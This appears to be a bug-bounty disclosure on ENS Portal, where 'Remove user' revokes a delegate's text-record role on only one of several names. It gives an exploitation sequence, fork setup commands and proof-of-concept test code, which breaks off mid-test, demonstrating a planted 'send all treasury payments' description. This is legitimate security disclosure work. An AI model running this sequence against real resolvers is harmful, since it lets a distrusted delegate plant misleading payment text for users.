# 92552 w a critical portal remove user from all roles revokes only one resolver scope the surviving scope permits a profile description write that remains after role cleanup

**Submitted on Sep 10th 2026 at 16:11:06 UTC by @IronsideSec for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92552
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

Portal combines all PermissionedResolver role assignments for one account into one row, even when they belong to different resolver resources. The row still displays both names, but **Remove user** does not revoke both raw assignments. It selects one non-root name, flattens the displayed roles into one bitmap, and prepares one name-scoped transaction while the confirmation promises removal “from all roles.”

In the primary reproduced state, the same delegate has `ROLE_SET_TEXT` (`16`) on two ordinary names sharing one resolver:

* `decoy-victim.eth`
* `treasury-victim.eth`

The connected owner has the exact root route/admin bitmap reproduced in the Portal fixture. The owner opens the delegate row, sees both names, confirms **Remove user**, and the transaction succeeds. Portal sends only:

```
authorizeNameRoles(dnsencode("decoy-victim.eth"), 16, delegate, false)
```

After invalidation and refetch, the first role is gone but `treasury-victim.eth: ROLE_SET_TEXT` remains. Reversing the raw input order reverses which name is omitted; one scope survives in either order.

The former delegate can use that surviving contract-authorized role before the owner discovers and revokes it. The pinned Sepolia fork proves a post-removal `setText(node, "description", arbitraryText)` write and resolves the replacement through the deployed Universal Resolver. Revoking the omitted role then blocks later writes but does not undo the stored description. Portal's real profile component requests `description` and renders the same fork-proved text.

This is not an EAC bypass: the write passes because Portal failed to revoke one valid `(resource, account)` assignment. It is unauthorized relative to the owner-confirmed account-wide removal. The authority is visible and recoverable; the stored value remains only until an authorized overwrite/clear or resolver change.

## Vulnerability Details

### 1. Account-only grouping loses the write model

[`groupRolesByAccount`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L179-L220) keys by account. For each later assignment it appends the raw role, appends decoded bits to one flat `decodedRoles` array, and independently adds the resolved name. [`ResolverRolesTable`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx#L66-L137) displays the grouped scopes and sends that one account row to the sidebar.

Grouping is safe for display, but removal must preserve each raw `(resource, roleBitmap)` pair. The raw `roles` array contains those pairs; the Remove path does not use it.

### 2. Remove selects one name and an aggregate bitmap

[`ResolverRolesSidebar.tsx:165-193`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L193) separately derives:

* `decodedRoles` from the flattened account row;
* `resolvedNames` from the displayed names; and
* `roleName` with `resolvedNames.find(n => n !== '(root)') ?? ''`.

[`handleRemoveUser`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L307-L323) stores only that one `roleName`, the account, and the flattened role list. The confirmation still asks whether to remove the user “from all roles” ([lines 441-448](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L441-L448)). The modal preparation and submitted action consume the same narrowed object ([lines 467-501](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L467-L501)); this is not only a label or preview defect.

[`prepareResolverRolesIntent`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/prepareResolverRolesIntent.ts#L32-L46) passes the pending remove object to [`prepareRevokeResolverRolesTransaction`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L29-L74). The latter selects root scope only for `name === ''`; an ordinary selected name becomes one `scope: 'name'` request.

The mounted route PoC hard-codes and asserts the exact resulting `data` bytes. The same bytes are replayed against the fork proxy. They decode as:

```
function: authorizeNameRoles(bytes,uint256,address,bool)
name:     decoy-victim.eth
bitmap:   16 (ROLE_SET_TEXT)
account:  0x2222222222222222222222222222222222222222
grant:    false
```

### 3. The successful contract call changes only one resource

At contracts-v2 commit [`8d1c89350729f87b3968cf41ef3d683951444a44`](https://github.com/ensdomains/contracts-v2/tree/8d1c89350729f87b3968cf41ef3d683951444a44), [`PermissionedResolver.authorizeNameRoles`](https://github.com/ensdomains/contracts-v2/blob/8d1c89350729f87b3968cf41ef3d683951444a44/contracts/src/resolver/PermissionedResolver.sol#L273-L293) computes the resource from the single supplied DNS name. [`EnhancedAccessControl._revokeRoles`](https://github.com/ensdomains/contracts-v2/blob/8d1c89350729f87b3968cf41ef3d683951444a44/contracts/src/access-control/EnhancedAccessControl.sol#L290-L315) updates only `_roles[resource][account]`. It does not know about the other assignments represented by Portal's grouped row.

The full route PoC uses a connected owner whose root bitmap is exactly:

```
ROLE_SET_ADDR | ROLE_SET_ADDR_ADMIN | ROLE_SET_TEXT_ADMIN
```

The real route gate checks root `ROLE_SET_ADDR` ([route lines 41-50](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/resolver/%24address/roles/index.tsx#L41-L50)). The owner's Text admin role lets the selected revoke succeed. The test executes the real route, table, sidebar, confirmation, intent builder and revoke builder, then simulates successful transport, invalidates/refetches the overview, and observes the second name still in the delegate row. A negative control submits both name-specific revokes and proves no Text role remains while the owner's route/admin state is unchanged.

### 4. The omitted role changes text that Portal renders

[`PermissionedResolver.setText`](https://github.com/ensdomains/contracts-v2/blob/8d1c89350729f87b3968cf41ef3d683951444a44/contracts/src/resolver/PermissionedResolver.sol#L475-L489) accepts the survivor because it still has `ROLE_SET_TEXT`. The Foundry PoC:

1. forks Sepolia at block `11,673,299`;
2. uses deployed `VerifiableFactory` `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef` and deployed PermissionedResolver implementation `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`;
3. registers two ordinary `.eth` names to one local-fork proxy for an ordinary EOA;
4. seeds only name-scoped Text roles for the delegate (delegate root bitmap is zero);
5. replays the exact Portal calldata captured by supplemental mounted controls for both possible raw orders;
6. writes the survivor's `description` as the delegate;
7. reads it through deployed Universal Resolver `0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe`;
8. revokes the surviving role and proves a second attacker write fails while the first text remains; and
9. proves an explicit owner record update repairs it.

The implementation has an exact Sourcify creation/runtime match. At the pinned block its runtime Keccak-256 is `0x7a5bbb7f5a8e46232a4437e8eea6cc6e935266ade1b8b027e4e04fb9ca8efd47`; the factory runtime hash is `0x810afc44bd6c35ac974ab80a8cf983cc6e514364b7a214b3a25df2d4e1e7ba60`.

Portal itself is the content sink. The public [`/$name` route mounts `NameProfileCard`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name/index.tsx#L371-L385). [`NameProfileCard`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/components/NameProfileCard.tsx#L37-L73) requests `description`, converts returned text records at [lines 75-77](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/components/NameProfileCard.tsx#L75-L77), and renders `texts.description` at [lines 115-120](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/components/NameProfileCard.tsx#L115-L120). [`getRecords`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/hooks/useRecords.ts#L19-L42) normally obtains those records through ENSJS. The focused component test stubs `getRecordsQueryOptions` with the exact name/key/value proved on the fork and keeps the real `NameProfileCard` request and render logic.

### 5. Exploitation sequence

1. One resolver serves two names. A delegate legitimately has name-scoped `ROLE_SET_TEXT` on each.
2. The owner later distrusts the delegate, opens the grouped row, sees both scopes, and chooses **Remove user**.
3. Portal promises removal from all roles. The owner confirms and signs one transaction. An ABI-aware wallet can show one selected name, bitmap `16`, delegate, and `false`.
4. The transaction succeeds for that name only. The unauthorized interval begins after this owner-confirmed account-wide action succeeds.
5. Before the owner notices the survivor after refetch and sends the corrective revoke, the former delegate writes arbitrary `description` text to the omitted name.
6. Corrective role cleanup blocks future writes but does not mutate the record already stored.
7. Portal displays the replacement until an authorized overwrite/clear or resolver change.

### 6. Preconditions and limitations

* The delegate previously held the exact role. This defect extends authority after incomplete revocation; it does not grant a stranger new authority.
* Two assignments for one account are required. The primary case uses two ordinary names with symmetric `ROLE_SET_TEXT`; no root role or row-order assumption is needed.
* The owner must choose Remove and approve one wallet transaction. The attacker cannot trigger that administrative action remotely.
* The owner needs sufficient admin authority for the selected bitmap. Otherwise the call reverts atomically and no false-success state arises.
* The demonstrated success path uses base manager role `ROLE_SET_TEXT`. Aggregate rows containing `_ADMIN` labels can instead fail during ENSJS preparation; this report does not claim every bitmap succeeds.
* Both names are visible before removal. An ABI-decoding wallet reveals the single selected name. The refetched row also reveals the survivor.
* The attacker must write after the incomplete transaction and before corrective cleanup. This is a post-success cleanup window, not a permanent role takeover.
* Role cleanup alone does not repair a value already written. An authorized record overwrite/clear or resolver change does.
* React renders text; no HTML or JavaScript execution, direct fund loss, or irreversible name loss is claimed.
* The PoC constructs a normal-reachable victim state; it does not claim that an organic matching resolver was found. All registrations, proxy state, permissions and writes exist only in discarded local fork state. No Sepolia write is broadcast.

### 7. Supplied known-issue comparison

The closest supplied entries do not describe this source/write path:

* **QA-01 / WEB-1257** concerns role combinations after transfer that make later profile/primary operations error. This report has no transfer: the owner-requested revoke succeeds and an omitted current resource permits a demonstrated content write.
* **WEB-1305** concerns a hang while transferring V2 roles to a V1 name. This report uses no transfer and emits valid PermissionedResolver revoke calldata.
* **R2-06**, labeled **Low** in the supplied list, concerns local session deletion leaving a time-bounded HCA co-owner permission on-chain. That is relevant adverse severity precedent, but it has a different package, state model, transaction, expiry behavior, and fix. Here Portal submits a resolver revoke to only one of several displayed resources, and the omitted resource permits the selected High-46 text consequence.

This also is not a positional stale-row-state issue: the account never changes and no checkbox state moves to another user. Stable row IDs or reset-on-account-change would not fix it. The required fix is resource-aware multi-revocation.

### Recommended remediation

1. Build Remove from `row.original.roles`, preserving every `(resource, roleBitmap)` assignment.
2. Emit `revokeRootRoles(bitmap, account)` for each root assignment and one `authorizeNameRoles(name, bitmap, account, false)` for each name assignment.
3. Do not derive write inputs from independent `resolvedNames` and flattened `decodedRoles` projections.
4. Enumerate every planned scope/bitmap before signature. If several transactions are needed, keep the account-wide action incomplete until all succeed.
5. After indexer sync, verify no raw assignment remains before reporting completion.
6. Apply the same pair-preserving model to Save and prompt a potentially compromised owner to inspect existing records.

## Impact Details

The exact selected impact is **High `46`: persistent static-content modification without JavaScript, including replacing existing text with arbitrary text**.

The reproduced effect is an arbitrary `description` replacement after an owner-confirmed operation promising to remove the delegate from all roles. The replacement resolves through the deployed Universal Resolver and Portal's real profile component renders the same string. Later role cleanup stops further attacker writes but does not undo the record, so repeated reads retain it until authorized repair or resolver change.

The report does not claim that the malformed revoke itself injects text, that EAC is bypassed, or that authority/content is irreversible. The High consequence depends on the former delegate using the omitted role during the disclosed cleanup window.

## References

* [Frozen scoped Portal source](https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal)
* [Account grouping](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L162-L220)
* [Grouped table](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx#L66-L137)
* [Single-name Remove action and confirmation](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L501)
* [Remove intent preparation](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/prepareResolverRolesIntent.ts#L32-L46)
* [Root-versus-name revoke builder](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L29-L104)
* [Portal name-route profile mount](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/routes/%24name/index.tsx#L371-L385)
* [Portal description request/render](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/profile/components/NameProfileCard.tsx#L37-L120)
* [PermissionedResolver name-role update](https://github.com/ensdomains/contracts-v2/blob/8d1c89350729f87b3968cf41ef3d683951444a44/contracts/src/resolver/PermissionedResolver.sol#L266-L294)
* [Resource-local EAC revocation](https://github.com/ensdomains/contracts-v2/blob/8d1c89350729f87b3968cf41ef3d683951444a44/contracts/src/access-control/EnhancedAccessControl.sol#L284-L315)
* [PermissionedResolver text write](https://github.com/ensdomains/contracts-v2/blob/8d1c89350729f87b3968cf41ef3d683951444a44/contracts/src/resolver/PermissionedResolver.sol#L475-L489)
* [Sourcify exact deployment metadata](https://sourcify.dev/server/v2/contract/11155111/0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e?fields=all)

## Proof of Concept

## Proof of Concept

The PoC is standalone below. The optional attachment only mirrors these files and is not required.

### Setup

1. Clone the scoped repository and check out the frozen target:

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout --detach 1c9b47f18fcddd2e864dfe385c4171061c9811ae
```

2. Use Node.js 22 and the repository-pinned `pnpm 10.27.0`, then install from the frozen lockfile:

```bash
corepack enable
corepack prepare pnpm@10.27.0 --activate
pnpm install --frozen-lockfile
```

3. Install Foundry (`forge`; reproduced with 1.5.1). The fork requires outbound HTTPS but no key or live transaction. `SEPOLIA_RPC_URL` is optional; the test defaults to public `https://sepolia.gateway.tenderly.co`.
4. From repository root, create `audit_workspace/renewed/lead010-aggregate-text-high/` and save every complete block below at its stated relative path. The blocks are byte-exact copies of the tested files.
5. Run, from repository root:

```bash
apps/portal/node_modules/.bin/vitest run --config audit_workspace/renewed/lead010-aggregate-text-high/portal-report-vitest.config.ts --reporter verbose
forge test --root audit_workspace/renewed/lead010-aggregate-text-high/fork-poc -vv
```

Expected decisive results:

```
Portal: 2 test files passed; 3 tests passed
- route removes decoy, refetches treasury-victim.eth:ROLE_SET_TEXT
- correct two-name negative leaves no delegate SET_TEXT authority
- profile component renders SEND ALL TREASURY PAYMENTS TO THE NEW ACCOUNT

Foundry: 1 suite passed; 3 tests passed
- each raw order clears only the selected role and preserves the other
- deployed Universal Resolver returns the attacker replacement
- text remains after omitted-role cleanup; explicit record repair restores it
- correct two-resource negative blocks both writes
```

Vitest can print a benign Radix warning about a missing Dialog description before passing.

### Complete files

#### `portal-report-vitest.config.ts`

```ts
import { fileURLToPath } from 'node:url'

const portal = fileURLToPath(new URL('../../../apps/portal', import.meta.url))
const repo = fileURLToPath(new URL('../../..', import.meta.url))
const deps = `${portal}/node_modules`

export default {
  root: portal,
  test: {
    globals: true,
    environment: 'happy-dom',
    include: [
      fileURLToPath(new URL('./portal-route.test.tsx', import.meta.url)),
      fileURLToPath(new URL('./portal-profile-render.test.tsx', import.meta.url)),
    ],
  },
  resolve: {
    alias: {
      '@': `${portal}/src`,
      wagmi: `${repo}/audit_workspace/renewed/lead010-aggregate-text-high/mocks/wagmi.ts`,
      '@ens-apps/transaction-manager': `${repo}/packages/transaction-manager/src`,
      '@ens-apps/utils': `${repo}/packages/utils/src`,
      '@testing-library/react': `${deps}/@testing-library/react`,
      '@tanstack/react-query': `${deps}/@tanstack/react-query`,
      '@tanstack/react-router': `${deps}/@tanstack/react-router`,
      '@tanstack/react-table': `${deps}/@tanstack/react-table`,
      viem: `${deps}/viem`,
      react: `${deps}/react`,
    },
    dedupe: ['react', 'react-dom', '@tanstack/react-query', '@tanstack/react-router'],
  },
}
```

#### `mocks/wagmi.ts`

```ts
const globals = globalThis as Record<string, unknown>

export const useConnection = () => ({
  address: globals.__lead010RouteVictim,
  isConnected: true,
})

export const useWalletClient = () => ({
  data:
    globals.__lead010RouteWalletClient ?? globals.__lead010High46WalletClient,
})

export const usePublicClient = () =>
  globals.__lead010RoutePublicClient ?? globals.__lead010High46PublicClient
```

#### `portal-route.test.tsx`

```tsx
import { cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import {
  createMemoryHistory,
  createRootRoute,
  createRoute,
  createRouter,
  Outlet,
  RouterProvider,
} from '@tanstack/react-router'
import { afterEach } from 'vitest'
import {
  decodeFunctionData,
  parseAbi,
  toHex,
  type Address,
  type Hex,
} from 'viem'
import { packetToBytes } from 'viem/ens'

const VICTIM = '0x1111111111111111111111111111111111111111' as const
const DELEGATE = '0x2222222222222222222222222222222222222222' as const
const RESOLVER = '0x4444444444444444444444444444444444444444' as const
const DECOY = 'decoy-victim.eth'
const TREASURY = 'treasury-victim.eth'
const ROOT_RESOURCE = `0x${'00'.repeat(32)}`
const CHAIN_ID = 11155111
const EXPECTED_DECOY_REMOVE =
  '0xbbd9abb5000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000100000000000000000000000002222222222222222222222222222222222222222000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120c6465636f792d76696374696d03657468000000000000000000000000000000' as const

type IndexedRole = {
  readonly account: string
  readonly resource: string
  readonly roleBitmap: string
  readonly blockNumber: number
  readonly transactionHash: Hex
  readonly timestamp: number
  readonly name: string | null
}

type Overview = {
  readonly id: string
  readonly address: string
  readonly nodeCount: number
  readonly aliasCount: number
  readonly roleHolderCount: number
  readonly nodes: readonly {
    readonly id: string
    readonly name: string
    readonly owner: { readonly id: string }
    readonly resolver: { readonly id: string; readonly address: string }
  }[]
  readonly aliases: readonly []
  readonly roles: readonly IndexedRole[]
  readonly events: readonly []
}

const mocks = vi.hoisted(() => ({
  startTransaction: vi.fn(),
  waitForTransaction: vi.fn(),
  pollForIndexerSync: vi.fn(),
  openModal: vi.fn(),
  closeModal: vi.fn(),
  clearTransaction: vi.fn(),
  outboundFetch: vi.fn(() => {
    throw new Error('LEAD-010 route-gate PoC forbids outbound fetch')
  }),
  overviewFetches: 0,
  hasRolesCalls: [] as Array<Record<string, unknown>>,
  overview: undefined as Overview | undefined,
  queryClient: undefined as QueryClient | undefined,
  preparedIntent: undefined as
    | { request: { to: Address; data: Hex } }
    | undefined,
  submittedIntent: undefined as
    | { request: { to: Address; data: Hex } }
    | undefined,
  walletClient: {
    account: { address: '0x1111111111111111111111111111111111111111' },
    chain: { id: 11155111 },
  } as never,
  publicClient: {} as never,
}))

vi.mock('@/lib/wagmi', () => ({
  sepoliaWithEns: { id: 11155111 },
  wagmiConfig: {},
}))
vi.mock('@/hooks/use-mobile', () => ({ useIsMobile: () => false }))
vi.mock('@/features/registry/utils/signer.helpers', () => ({
  createEOASigner: () => ({ kind: 'route-gate-signer' }),
}))
vi.mock('@/features/roles/hooks/useResetMutationsOnAccountChange', () => ({
  useResetMutationsOnAccountChange: () => undefined,
}))
vi.mock('@/components/CopyButton', () => ({ CopyButton: () => null }))
vi.mock('@/features/resolver/components/ResolverAddUserSheet', () => ({
  ResolverAddUserSheet: () => null,
}))
vi.mock('@/features/transaction-manager/hooks/useTransactionModal', () => ({
  useTransactionModal: () => ({
    openModal: mocks.openModal,
    closeModal: mocks.closeModal,
    clearTransaction: mocks.clearTransaction,
  }),
}))
vi.mock('@/utils/queryClient', () => ({
  queryClient: {
    prefetchQuery: (options: unknown) =>
      mocks.queryClient?.prefetchQuery(options as never),
  },
}))
vi.mock('@/features/resolver/hooks/useResolverOverview', () => ({
  getResolverOverviewQueryOptions: ({ address }: { address: Address }) => ({
    queryKey: ['resolver-overview', { address }],
    queryFn: async () => {
      mocks.overviewFetches += 1
      return structuredClone(mocks.overview)
    },
    staleTime: 0,
  }),
}))
vi.mock('@/features/registry/hooks/useHasRoles', () => ({
  getHasRolesQueryOptions: (params: Record<string, unknown>) => ({
    queryKey: ['hasRoles', params],
    queryFn: async () => {
      mocks.hasRolesCalls.push(params)
      return true
    },
    staleTime: 0,
  }),
}))
vi.mock('@/utils/query/pollForIndexerSync', () => ({
  pollForIndexerSync: mocks.pollForIndexerSync,
}))
vi.mock('@ens-apps/transaction-manager', () => ({
  transactionManager: { startTransaction: mocks.startTransaction },
  waitForTransaction: mocks.waitForTransaction,
}))
vi.mock('@/features/transaction-manager/components/TransactionModal', () => ({
  TransactionModal: ({
    transactions,
  }: {
    transactions: Array<Record<string, unknown>>
  }) => {
    const transaction = transactions[0] as {
      readonly intent?: {
        readonly prepare?: (context: Record<string, unknown>) => {
          request: { to: Address; data: Hex }
        }
      }
      readonly onStart?: () => void
      readonly onDone?: () => void
    }
    return transaction.intent?.prepare ? (
      <div>
        <button
          type="button"
          onClick={() => {
            mocks.preparedIntent = transaction.intent?.prepare?.({
              walletClient: mocks.walletClient,
              publicClient: mocks.publicClient,
              chainId: CHAIN_ID,
            })
            transaction.onStart?.()
          }}
        >
          Execute captured modal action
        </button>
        <button type="button" onClick={() => transaction.onDone?.()}>
          Finalize successful transaction
        </button>
      </div>
    ) : null
  },
}))

import { Route as resolverRolesRouteImport } from '../../../apps/portal/src/routes/resolver/$address/roles/index'
import { prepareRevokeResolverRolesTransaction } from '../../../apps/portal/src/features/resolver/helpers/revokeResolverRoles'
import {
  computeNameResource,
  resolverRoles,
} from '../../../apps/portal/src/lib/roles/resolverRoles'

const roleAbi = parseAbi([
  'function authorizeNameRoles(bytes toName, uint256 roleBitmap, address account, bool grant) returns (bool)',
  'function revokeRootRoles(uint256 roleBitmap, address account) returns (bool)',
])

const VICTIM_REQUIRED_ROOT_BITMAP =
  resolverRoles.ROLE_SET_ADDR |
  resolverRoles.ROLE_SET_ADDR_ADMIN |
  resolverRoles.ROLE_SET_TEXT_ADMIN

const initialOverview = (): Overview => ({
  id: RESOLVER.toLowerCase(),
  address: RESOLVER,
  nodeCount: 2,
  aliasCount: 0,
  roleHolderCount: 2,
  nodes: [DECOY, TREASURY].map((name) => ({
    id: computeNameResource(name),
    name,
    owner: { id: VICTIM.toLowerCase() },
    resolver: { id: RESOLVER.toLowerCase(), address: RESOLVER },
  })),
  aliases: [],
  roles: [
    {
      account: VICTIM,
      resource: ROOT_RESOURCE,
      roleBitmap: toHex(VICTIM_REQUIRED_ROOT_BITMAP),
      blockNumber: 1,
      transactionHash: `0x${'11'.repeat(32)}`,
      timestamp: 1,
      name: null,
    },
    {
      account: DELEGATE,
      resource: computeNameResource(DECOY),
      roleBitmap: toHex(resolverRoles.ROLE_SET_TEXT),
      blockNumber: 2,
      transactionHash: `0x${'22'.repeat(32)}`,
      timestamp: 2,
      name: DECOY,
    },
    {
      account: DELEGATE,
      resource: computeNameResource(TREASURY),
      roleBitmap: toHex(resolverRoles.ROLE_SET_TEXT),
      blockNumber: 3,
      transactionHash: `0x${'33'.repeat(32)}`,
      timestamp: 3,
      name: TREASURY,
    },
  ],
  events: [],
})

const applyResolverCall = (data: Hex) => {
  if (!mocks.overview) throw new Error('overview not seeded')

  const decoded = decodeFunctionData({ abi: roleAbi, data })
  if (decoded.functionName === 'authorizeNameRoles') {
    const [dnsName, bitmap, account, grant] = decoded.args
    expect(grant).toBe(false)
    const selectedName =
      dnsName === toHex(packetToBytes(DECOY))
        ? DECOY
        : dnsName === toHex(packetToBytes(TREASURY))
          ? TREASURY
          : undefined
    expect(selectedName).toBeDefined()
    mocks.overview = {
      ...mocks.overview,
      roles: mocks.overview.roles.filter(
        (role) =>
          !(
            role.account.toLowerCase() === account.toLowerCase() &&
            role.resource.toLowerCase() ===
              computeNameResource(selectedName as string).toLowerCase() &&
            (BigInt(role.roleBitmap) & bitmap) !== 0n
          ),
      ),
    }
    return
  }

  const [bitmap, account] = decoded.args
  mocks.overview = {
    ...mocks.overview,
    roles: mocks.overview.roles.filter(
      (role) =>
        !(
          role.account.toLowerCase() === account.toLowerCase() &&
          role.resource.toLowerCase() === ROOT_RESOURCE &&
          (BigInt(role.roleBitmap) & bitmap) !== 0n
        ),
    ),
  }
}

const delegateCanSetText = () =>
  Boolean(
    mocks.overview?.roles.some(
      (role) =>
        role.account.toLowerCase() === DELEGATE.toLowerCase() &&
        (BigInt(role.roleBitmap) & resolverRoles.ROLE_SET_TEXT) !== 0n,
    ),
  )

const makeRouter = (queryClient: QueryClient) => {
  const rootRoute = createRootRoute({
    component: () => (
      <QueryClientProvider client={queryClient}>
        <Outlet />
      </QueryClientProvider>
    ),
  })
  const resolverRoute = createRoute({
    getParentRoute: () => rootRoute,
    path: '/resolver/$address',
    component: Outlet,
  })
  const rolesRoute = resolverRolesRouteImport.update({
    id: '/roles',
    path: '/roles',
    getParentRoute: () => resolverRoute,
  } as never)
  const routeTree = rootRoute.addChildren([
    resolverRoute.addChildren([rolesRoute]),
  ])
  return createRouter({
    routeTree,
    history: createMemoryHistory({
      initialEntries: [`/resolver/${RESOLVER}/roles`],
    }),
  })
}

describe('LEAD-010 High-46 route gate and refetch', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    mocks.overviewFetches = 0
    mocks.hasRolesCalls = []
    mocks.overview = initialOverview()
    mocks.preparedIntent = undefined
    mocks.submittedIntent = undefined
    mocks.queryClient = new QueryClient({
      defaultOptions: {
        queries: { retry: false, gcTime: 0, staleTime: 0 },
        mutations: { retry: false },
      },
    })
    ;(globalThis as Record<string, unknown>).__lead010RouteVictim = VICTIM
    ;(globalThis as Record<string, unknown>).__lead010RouteWalletClient =
      mocks.walletClient
    ;(globalThis as Record<string, unknown>).__lead010RoutePublicClient =
      mocks.publicClient
    globalThis.fetch = mocks.outboundFetch as never

    mocks.startTransaction.mockImplementation((intent) => {
      mocks.submittedIntent = intent
      return 'lead-010-route-gate-transaction'
    })
    mocks.waitForTransaction.mockImplementation(async () => {
      if (!mocks.submittedIntent) throw new Error('missing submitted intent')
      applyResolverCall(mocks.submittedIntent.request.data)
      return { hash: `0x${'99'.repeat(32)}` }
    })
    mocks.pollForIndexerSync.mockImplementation(
      async ({
        invalidateQueries,
      }: {
        invalidateQueries: () => Promise<void>
      }) => invalidateQueries(),
    )
  })

  afterEach(() => {
    cleanup()
    mocks.queryClient?.clear()
  })

  it('passes the connected-victim gate, removes one name, and refetches the surviving profile authority', async () => {
    if (!mocks.queryClient) throw new Error('query client missing')
    const router = makeRouter(mocks.queryClient)
    render(<RouterProvider router={router} />)

    expect(await screen.findByRole('heading', { name: 'Roles' })).toBeTruthy()
    expect(await screen.findByRole('button', { name: 'Add user' })).toBeTruthy()
    await waitFor(() => expect(mocks.hasRolesCalls.length).toBeGreaterThan(0))
    expect(mocks.hasRolesCalls.at(-1)).toEqual({
      resolverAddress: RESOLVER,
      roles: ['ROLE_SET_ADDR'],
      account: VICTIM,
    })

    const delegateBadge = screen.getByText('0x2222…2222')
    const delegateRow = delegateBadge.closest('tr')
    expect(delegateRow).not.toBeNull()
    expect(within(delegateRow as HTMLElement).getByText(DECOY)).toBeTruthy()
    expect(within(delegateRow as HTMLElement).getByText(TREASURY)).toBeTruthy()
    fireEvent.click(
      within(delegateRow as HTMLElement).getByRole('button', {
        name: 'Edit user roles',
      }),
    )

    expect(
      await screen.findByText(
        `Roles scoped to ${DECOY}, ${TREASURY}`,
      ),
    ).toBeTruthy()
    fireEvent.click(screen.getByRole('button', { name: 'Remove user' }))
    expect(
      await screen.findByText(
        'Are you sure you want to remove this user from all roles? This action cannot be undone.',
      ),
    ).toBeTruthy()
    fireEvent.click(screen.getByRole('button', { name: 'Remove' }))
    fireEvent.click(
      await screen.findByRole('button', {
        name: 'Execute captured modal action',
      }),
    )

    await waitFor(() => expect(mocks.startTransaction).toHaveBeenCalledTimes(1))
    await waitFor(() =>
      expect(
        mocks.overview?.roles.some(
          (role) =>
            role.account.toLowerCase() === DELEGATE.toLowerCase() &&
            role.resource.toLowerCase() ===
              computeNameResource(DECOY).toLowerCase(),
        ),
      ).toBe(false),
    )
    await waitFor(() => expect(mocks.overviewFetches).toBeGreaterThanOrEqual(2))

    expect(mocks.submittedIntent).toEqual(mocks.preparedIntent)
    expect(mocks.submittedIntent?.request.data).toBe(EXPECTED_DECOY_REMOVE)
    if (!mocks.submittedIntent) throw new Error('intent not submitted')
    const submitted = decodeFunctionData({
      abi: roleAbi,
      data: mocks.submittedIntent.request.data,
    })
    expect(submitted.functionName).toBe('authorizeNameRoles')
    expect(submitted.args).toEqual([
      toHex(packetToBytes(DECOY)),
      resolverRoles.ROLE_SET_TEXT,
      DELEGATE,
      false,
    ])

    fireEvent.click(
      screen.getByRole('button', { name: 'Finalize successful transaction' }),
    )
    await waitFor(() => {
      const currentDelegateRow = screen
        .getByText('0x2222…2222')
